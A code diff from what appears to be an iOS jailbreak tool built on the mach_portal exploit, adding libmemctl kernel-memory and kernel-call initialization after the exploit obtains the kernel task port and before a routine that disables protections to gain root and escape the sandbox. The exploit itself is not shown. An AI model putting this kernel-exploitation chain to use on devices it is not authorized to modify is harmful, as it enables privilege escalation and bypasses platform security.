@@ -3,7 +3,14 @@
 #include <unistd.h>
 
 #include "memctl/core.h"
+#include "memctl/kernel.h"
+#include "memctl/kernel_call.h"
+#include "memctl/kernel_memory.h"
+#include "memctl/kernel_slide.h"
 #include "memctl/memctl_error.h"
+#include "memctl/platform.h"
+#include "memctl/process.h"
+#include "memctl/symbol_finders.h"
 
 #include "sandbox_escape.h"
 #include "kernel_sploit.h"
@@ -56,9 +63,25 @@ int jb_go() {
   
   printf("[+] got kernel task port!\n");
   printf("[+] kernel is at 0x%llx\n", kernel_base);
-  
+
+  // Initialize libmemctl.
   kernel_task = kernel_task_port;
-  
+  bool success;
+  platform_init();
+  kernel_memory_init();
+  success = kernel_init(NULL);
+  assert(success);
+  kernel_symbol_finders_init();
+  success = kernel_slide_init();
+  assert(success);
+  success = kernel_init(NULL);
+  assert(success);
+  success = kernel_call_init();
+  assert(success);
+  kernel_memory_init();
+  process_init();
+  printf("[+] initialized libmemctl\n");
+
   // get root and leave the sandbox
   disable_protections(kernel_base, realhost, "mach_portal");
   
